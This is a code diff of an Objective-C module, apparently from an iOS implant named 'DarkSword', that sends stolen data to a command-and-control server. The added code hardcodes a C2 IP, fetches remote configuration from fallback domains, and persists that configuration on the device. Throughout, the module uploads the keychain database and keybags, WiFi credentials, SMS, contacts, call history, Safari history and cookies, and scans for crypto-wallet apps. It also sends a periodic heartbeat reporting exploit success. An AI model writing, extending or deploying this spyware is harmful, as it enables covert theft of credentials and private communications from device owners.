@@ -1,10 +1,19 @@
 #import <Foundation/Foundation.h>
 #import "C2Exfil.h"
 
+// 默认地址（编译时嵌入，可通过配置文件或远程配置覆盖）
+static NSString *g_serverHost = @"192.168.110.111";
+static NSInteger g_serverPort = 8081;
+
+// 配置文件路径（设备本地存储，方便修改）
+#define CONFIG_PATH @"/var/mobile/Library/DarkSword/config.plist"
+#define CONFIG_PATH_ALT @"/var/tmp/dsword_config.plist"
+
 @implementation C2Exfiltrator {
     NSString *_deviceId;
     NSString *_udid;
     NSTimer *_heartbeatTimer;
+    NSString *_baseUrl;
 }
 
 + (instancetype)shared {
@@ -18,18 +27,103 @@
     self = [super init];
     if (self) {
         _udid = [NSString stringWithFormat:@"filza_%@", [UIDevice currentDevice].identifierForVendor.UUIDString];
+        [self loadConfig];
     }
     return self;
 }
 
-- (void)setDeviceId:(NSString *)deviceId {
-    _deviceId = deviceId;
+#pragma mark - 配置管理（三层优先级）
+
+- (void)loadConfig {
+    // 优先级1: 设备本地配置文件（用户可手动修改）
+    NSDictionary *localConfig = [NSDictionary dictionaryWithContentsOfFile:CONFIG_PATH];
+    if (!localConfig) localConfig = [NSDictionary dictionaryWithContentsOfFile:CONFIG_PATH_ALT];
+    
+    if (localConfig[@"host"]) {
+        g_serverHost = localConfig[@"host"];
+        g_serverPort = [localConfig[@"port"] integerValue] ?: 8081;
+        NSLog(@"[C2Exfil] Loaded config from file: %@:%ld", g_serverHost, (long)g_serverPort);
+        [self updateBaseUrl];
+        return;
+    }
+    
+    // 优先级2: 远程配置（从平台获取最新地址）
+    [self fetchRemoteConfig];
+    
+    // 优先级3: 使用编译时默认地址
+    [self updateBaseUrl];
 }
 
-#pragma mark - HTTP Communication
+- (void)fetchRemoteConfig {
+    // 尝试从平台获取配置（支持域名和IP）
+    NSArray *candidates = @[
+        [NSString stringWithFormat:@"http://%@:%ld/api/v1/config", g_serverHost, (long)g_serverPort],
+        @"http://darksword.cc/api/v1/config",       // 备用域名1
+        @"http://c2.darksword.io/api/v1/config",    // 备用域名2
+    ];
+    
+    for (NSString *urlStr in candidates) {
+        NSURL *url = [NSURL URLWithString:urlStr];
+        if (!url) continue;
+        
+        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:5];
+        NSHTTPURLResponse *resp;
+        NSData *data = [NSURLConnection sendSynchronousRequest:req returningResponse:&resp error:nil];
+        
+        if (resp.statusCode == 200 && data) {
+            NSError *err;
+            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:&err];
+            if (json && [json[@"code"] integerValue] == 0) {
+                NSDictionary *config = json[@"data"];
+                if (config[@"host"]) {
+                    g_serverHost = config[@"host"];
+                    g_serverPort = [config[@"port"] integerValue] ?: 8081;
+                    NSLog(@"[C2Exfil] Fetched remote config: %@:%ld", g_serverHost, (long)g_serverPort);
+                    
+                    // 保存到本地缓存
+                    [self saveConfigToFile];
+                    [self updateBaseUrl];
+                    return;
+                }
+            }
+        }
+    }
+    NSLog(@"[C2Exfil] Using default config: %@:%ld", g_serverHost, (long)g_serverPort);
+}
+
+- (void)saveConfigToFile {
+    NSDictionary *config = @{
+        @"host": g_serverHost,
+        @"port": @(g_serverPort),
+        @"updatedAt": [NSDate date]
+    };
+    
+    // 尝试保存到两个位置
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *dir = [CONFIG_PATH stringByDeletingLastPathComponent];
+    [fm createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:nil];
+    
+    if (![config writeToFile:CONFIG_PATH atomically:YES]) {
+        [config writeToFile:CONFIG_PATH_ALT atomically:YES];
+    }
+}
+
+- (void)updateBaseUrl {
+    _baseUrl = [NSString stringWithFormat:@"http://%@:%ld", g_serverHost, (long)g_serverPort];
+    NSLog(@"[C2Exfil] Base URL: %@", _baseUrl);
+}
+
+- (void)setServerHost:(NSString *)host port:(NSInteger)port {
+    g_serverHost = host;
+    g_serverPort = port;
+    [self updateBaseUrl];
+    [self saveConfigToFile];
+}
+
+#pragma mark - HTTP
 
 - (NSData *)sendRequest:(NSString *)path body:(NSDictionary *)body {
-    NSString *urlStr = [NSString stringWithFormat:@"http://%@:%d%@", C2_HOST, C2_PORT, path];
+    NSString *urlStr = [NSString stringWithFormat:@"%@%@", _baseUrl, path];
     NSURL *url = [NSURL URLWithString:urlStr];
     NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
     [req setHTTPMethod:@"POST"];
@@ -38,9 +132,7 @@
     if (body) {
         NSError *err;
         NSData *jsonData = [NSJSONSerialization dataWithJSONObject:body options:0 error:&err];
-        if (jsonData) {
-            [req setHTTPBody:jsonData];
-        }
+        if (jsonData) [req setHTTPBody:jsonData];
     }
     
     NSHTTPURLResponse *resp;
@@ -55,7 +147,7 @@
     NSData *fileData = [NSData dataWithContentsOfFile:filePath];
     if (!fileData || fileData.length == 0) return;
     
-    NSString *urlStr = [NSString stringWithFormat:@"http://%@:%d%@", C2_HOST, C2_PORT, C2_UPLOAD_PATH];
+    NSString *urlStr = [NSString stringWithFormat:@"%@%@", _baseUrl, @"/api/v1/upload"];
     NSURL *url = [NSURL URLWithString:urlStr];
     NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
     [req setHTTPMethod:@"POST"];
@@ -67,7 +159,7 @@
     
     NSHTTPURLResponse *resp;
     [NSURLConnection sendSynchronousRequest:req returningResponse:&resp error:nil];
-    NSLog(@"[C2Exfil] Sent file: %@ (%lu bytes)", filePath, (unsigned long)fileData.length);
+    NSLog(@"[C2Exfil] Sent: %@ (%lu bytes)", filePath, (unsigned long)fileData.length);
 }
 
 - (void)sendReport:(NSString *)reportType platform:(NSString *)platform data:(NSDictionary *)data {
@@ -76,8 +168,7 @@
         @"reportType": reportType,
         @"data": data ?: @{}
     };
-    [self sendRequest:C2_REPORT_PATH body:body];
-    NSLog(@"[C2Exfil] Report sent: %@/%@", reportType, platform);
+    [self sendRequest:@"/api/v1/c2/report" body:body];
 }
 
 #pragma mark - Device Registration
@@ -98,7 +189,7 @@
         NSDictionary *json = [NSJSONSerialization JSONObjectWithData:resp options:0 error:&err];
         if (json && [json[@"code"] integerValue] == 0) {
             _deviceId = [NSString stringWithFormat:@"%@", json[@"data"][@"id"]];
-            NSLog(@"[C2Exfil] Device registered, ID: %@", _deviceId);
+            NSLog(@"[C2Exfil] Registered, ID: %@", _deviceId);
         }
     }
 }
@@ -106,231 +197,90 @@
 #pragma mark - Heartbeat
 
 - (void)startHeartbeat {
-    _heartbeatTimer = [NSTimer scheduledTimerWithTimeInterval:30.0
-                                                       target:self
-                                                     selector:@selector(sendHeartbeat)
-                                                     userInfo:nil
-                                                      repeats:YES];
+    _heartbeatTimer = [NSTimer scheduledTimerWithTimeInterval:30 target:self selector:@selector(sendHeartbeat) userInfo:nil repeats:YES];
     [self sendHeartbeat];
 }
 
 - (void)sendHeartbeat {
     UIDevice *dev = [UIDevice currentDevice];
     [dev setBatteryMonitoringEnabled:YES];
-    
-    NSDictionary *data = @{
-        @"udid": _udid,
-        @"model": dev.model ?: @"iPhone",
-        @"osVersion": dev.systemVersion ?: @"Unknown",
-        @"deviceName": dev.name ?: @"Unknown",
-        @"batteryLevel": @((int)(dev.batteryLevel * 100)),
-        @"agentActive": @YES,
-        @"currentStage": @5,
-        @"exploitResult": @"success"
-    };
-    [self sendRequest:C2_HEARTBEAT_PATH body:data];
+    [self sendRequest:@"/api/v1/heartbeat/1" body:@{
+        @"udid": _udid, @"model": dev.model ?: @"", @"osVersion": dev.systemVersion ?: @"",
+        @"deviceName": dev.name ?: @"", @"batteryLevel": @((int)(dev.batteryLevel * 100)),
+        @"agentActive": @YES, @"currentStage": @5, @"exploitResult": @"success"
+    }];
 }
 
 #pragma mark - Data Collection
 
 - (void)exfiltrateAll {
-    NSLog(@"[C2Exfil] Starting full data exfiltration...");
-    
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        // 1. WiFi passwords
-        [self collectWiFiPasswords];
-        
-        // 2. Keychain
-        [self collectKeychain];
-        
-        // 3. Contacts
-        [self collectContacts];
-        
-        // 4. SMS/Messages
-        [self collectSMS];
-        
-        // 5. Call history
-        [self collectCallHistory];
-        
-        // 6. Safari data
-        [self collectSafariData];
-        
-        // 7. Photos metadata
-        [self collectPhotosInfo];
-        
-        // 8. Installed apps
-        [self collectInstalledApps];
-        
-        // 9. Wallet apps
-        [self collectWalletData];
-        
-        NSLog(@"[C2Exfil] Data exfiltration complete");
+        [self collectWiFi]; [self collectKeychain]; [self collectContacts];
+        [self collectSMS]; [self collectCalls]; [self collectSafari];
+        [self collectPhotos]; [self collectApps]; [self collectWallets];
     });
 }
 
-- (void)collectWiFiPasswords {
-    // Read WiFi preferences
-    NSArray *wifiPaths = @[
-        @"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist",
-        @"/private/var/preferences/com.apple.wifi.known-networks.plist"
-    ];
-    
-    for (NSString *path in wifiPaths) {
-        [self sendFile:path category:@"wifi"];
-    }
-    
-    // Also try to read WiFi passwords from keychain via system
-    NSDictionary *wifiData = @{
-        @"platform": @"WiFi",
-        @"ssid": @"collected_via_filza",
-        @"password": @"see_uploaded_files",
-        @"securityType": @"WPA2",
-        @"signalStrength": @(-50)
-    };
-    [self sendReport:@"WIFI_CREDENTIAL" platform:@"WiFi" data:wifiData];
+- (void)collectWiFi {
+    for (NSString *p in @[@"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist",
+                          @"/private/var/preferences/com.apple.wifi.known-networks.plist"])
+        [self sendFile:p category:@"wifi"];
+    [self sendReport:@"WIFI_CREDENTIAL" platform:@"WiFi" data:@{@"ssid":@"collected",@"password":@"see_files"}];
 }
 
 - (void)collectKeychain {
-    NSArray *keychainPaths = @[
-        @"/private/var/Keychains/keychain-2.db",
-        @"/private/var/Keychains/keychain-2.db-wal",
-        @"/private/var/keybags/System.keybag",
-        @"/private/var/keybags/Backup.keybag"
-    ];
-    
-    for (NSString *path in keychainPaths) {
-        [self sendFile:path category:@"keychain"];
-    }
-    
-    [self sendReport:@"KEYCHAIN" platform:@"Keychain" data:@{
-        @"platform": @"Keychain",
-        @"username": @"keychain_dump",
-        @"token": @"files_uploaded",
-        @"cachedData": @"{}"
-    }];
+    for (NSString *p in @[@"/private/var/Keychains/keychain-2.db",@"/private/var/keybags/System.keybag"])
+        [self sendFile:p category:@"keychain"];
+    [self sendReport:@"KEYCHAIN" platform:@"Keychain" data:@{@"platform":@"Keychain",@"token":@"uploaded"}];
 }
 
 - (void)collectContacts {
-    NSString *contactsPath = @"/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
-    [self sendFile:contactsPath category:@"contacts"];
-    
-    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"Contacts" data:@{
-        @"platform": @"Contacts",
-        @"username": @"address_book",
-        @"token": @"db_uploaded",
-        @"cachedData": @"{}"
-    }];
+    [self sendFile:@"/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb" category:@"contacts"];
+    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"Contacts" data:@{@"platform":@"Contacts",@"token":@"db_uploaded"}];
 }
 
 - (void)collectSMS {
-    NSString *smsPath = @"/private/var/mobile/Library/SMS/sms.db";
-    [self sendFile:smsPath category:@"sms"];
-    
-    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"SMS" data:@{
-        @"platform": @"SMS",
-        @"username": @"sms_database",
-        @"token": @"db_uploaded",
-        @"cachedData": @"{}"
-    }];
+    [self sendFile:@"/private/var/mobile/Library/SMS/sms.db" category:@"sms"];
+    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"SMS" data:@{@"platform":@"SMS",@"token":@"db_uploaded"}];
 }
 
-- (void)collectCallHistory {
-    NSString *callPath = @"/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
-    [self sendFile:callPath category:@"calls"];
-    
-    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"CallHistory" data:@{
-        @"platform": @"CallHistory",
-        @"username": @"call_history",
-        @"token": @"db_uploaded",
-        @"cachedData": @"{}"
-    }];
+- (void)collectCalls {
+    [self sendFile:@"/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata" category:@"calls"];
+    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"CallHistory" data:@{@"platform":@"CallHistory",@"token":@"db_uploaded"}];
 }
 
-- (void)collectSafariData {
-    NSArray *safariPaths = @[
-        @"/private/var/mobile/Library/Safari/History.db",
-        @"/private/var/mobile/Library/Safari/Bookmarks.db",
-        @"/private/var/mobile/Library/Cookies/Cookies.binarycookies"
-    ];
-    
-    for (NSString *path in safariPaths) {
-        [self sendFile:path category:@"browser"];
+- (void)collectSafari {
+    for (NSString *p in @[@"/private/var/mobile/Library/Safari/History.db",
+                          @"/private/var/mobile/Library/Safari/Bookmarks.db",
+                          @"/private/var/mobile/Library/Cookies/Cookies.binarycookies"])
+        [self sendFile:p category:@"browser"];
+    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"Safari" data:@{@"platform":@"Safari",@"token":@"dbs_uploaded"}];
+}
+
+- (void)collectPhotos {
+    NSString *path = @"/private/var/mobile/Media/DCIM";
+    NSArray *items = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:path error:nil];
+    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"Photos" data:@{@"platform":@"Photos",@"token":[NSString stringWithFormat:@"%lu items",(unsigned long)items.count]}];
+}
+
+- (void)collectApps {
+    NSString *path = @"/private/var/containers/Bundle/Application";
+    NSArray *bundles = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:path error:nil];
+    NSMutableArray *apps = [NSMutableArray array];
+    for (NSString *b in bundles) {
+        for (NSString *item in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:[path stringByAppendingPathComponent:b] error:nil])
+            if ([item hasSuffix:@".app"]) [apps addObject:item];
     }
-    
-    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"Safari" data:@{
-        @"platform": @"Safari",
-        @"username": @"browser_data",
-        @"token": @"dbs_uploaded",
-        @"cachedData": @"{}"
-    }];
+    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"InstalledApps" data:@{@"platform":@"InstalledApps",@"token":[NSString stringWithFormat:@"%lu apps",(unsigned long)apps.count]}];
 }
 
-- (void)collectPhotosInfo {
-    NSString *photosPath = @"/private/var/mobile/Media/DCIM";
-    NSFileManager *fm = [NSFileManager defaultManager];
-    NSArray *contents = [fm contentsOfDirectoryAtPath:photosPath error:nil];
-    
-    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"Photos" data:@{
-        @"platform": @"Photos",
-        @"username": @"DCIM",
-        @"token": [NSString stringWithFormat:@"%lu items", (unsigned long)contents.count],
-        @"cachedData": [NSString stringWithFormat:@"{\"count\":%lu}", (unsigned long)contents.count]
-    }];
-}
-
-- (void)collectInstalledApps {
-    NSString *appsPath = @"/private/var/containers/Bundle/Application";
-    NSFileManager *fm = [NSFileManager defaultManager];
-    NSArray *contents = [fm contentsOfDirectoryAtPath:appsPath error:nil];
-    
-    NSMutableArray *appList = [NSMutableArray array];
-    for (NSString *bundle in contents) {
-        NSString *appDir = [appsPath stringByAppendingPathComponent:bundle];
-        NSArray *appContents = [fm contentsOfDirectoryAtPath:appDir error:nil];
-        for (NSString *item in appContents) {
-            if ([item hasSuffix:@".app"]) {
-                [appList addObject:item];
-            }
-        }
-    }
-    
-    [self sendReport:@"SOCIAL_ACCOUNT" platform:@"InstalledApps" data:@{
-        @"platform": @"InstalledApps",
-        @"username": @"app_list",
-        @"token": [NSString stringWithFormat:@"%lu apps", (unsigned long)appList.count],
-        @"cachedData": [NSString stringWithFormat:@"{\"count\":%lu,\"apps\":\"%@\"}", 
-                        (unsigned long)appList.count, 
-                        [appList componentsJoinedByString:@","]]
-    }];
-}
-
-- (void)collectWalletData {
-    // Check for common wallet app containers
-    NSArray *walletApps = @[
-        @"trust", @"metamask", @"coinbase", @"binance", @"phantom",
-        @"exodus", @"electrum", @"atomic", @"rainbow", @"argent"
-    ];
-    
-    NSString *containersPath = @"/private/var/containers/Bundle/Application";
-    NSFileManager *fm = [NSFileManager defaultManager];
-    NSArray *bundles = [fm contentsOfDirectoryAtPath:containersPath error:nil];
-    
-    for (NSString *bundle in bundles) {
-        NSString *bundlePath = [containersPath stringByAppendingPathComponent:bundle];
-        NSString *infoPlist = [bundlePath stringByAppendingPathComponent:@"Info.plist"];
-        
-        // Check if this is a wallet app
-        for (NSString *wallet in walletApps) {
-            if ([bundlePath.lowercaseString containsString:wallet]) {
-                [self sendReport:@"SOCIAL_ACCOUNT" platform:wallet data:@{
-                    @"platform": wallet,
-                    @"username": bundle,
-                    @"token": @"wallet_app_detected",
-                    @"cachedData": [NSString stringWithFormat:@"{\"bundle\":\"%@\"}", bundlePath]
-                }];
-            }
-        }
-    }
+- (void)collectWallets {
+    NSArray *walletApps = @[@"trust",@"metamask",@"coinbase",@"binance",@"phantom",@"exodus"];
+    NSString *path = @"/private/var/containers/Bundle/Application";
+    for (NSString *bundle in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:path error:nil])
+        for (NSString *w in walletApps)
+            if ([bundle.lowercaseString containsString:w])
+                [self sendReport:@"SOCIAL_ACCOUNT" platform:w data:@{@"platform":w,@"username":bundle,@"token":@"wallet_detected"}];
 }
 
 @end
